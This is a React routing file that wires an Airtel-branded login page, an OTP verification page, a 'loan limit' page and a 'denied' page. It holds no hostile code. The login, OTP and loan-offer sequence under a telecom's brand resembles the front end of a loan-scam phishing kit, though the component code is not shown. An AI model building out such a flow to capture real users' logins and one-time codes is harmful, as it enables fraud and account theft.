import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import { LanguageProvider } from './LanguageContext'; 
import AirtelLogin from './AirtelLogin';
import AirtelOTPVerify from './AirtelOTPVerify';
import AirtelLoanLimit from './AirtelLoanLimit';
import AirtelDenied from './AirtelDenied';

function App() {
  return (
    <LanguageProvider>
      <Router>
        <Routes>
          {/* 1. Login page is now the direct entry point */}
          <Route path="/" element={<AirtelLogin />} />
          
          {/* Kept for backward compatibility (e.g., if you have links pointing to /login) */}
          <Route path="/login" element={<AirtelLogin />} />
          
          {/* 2. Airtel App Routes */}
          <Route path="/airtel-otp" element={<AirtelOTPVerify />} />
          <Route path="/airtel-loan-limit" element={<AirtelLoanLimit />} />
          <Route path="/airtel-denied" element={<AirtelDenied />} />
        </Routes>
      </Router>
    </LanguageProvider>
  );
}

export default App;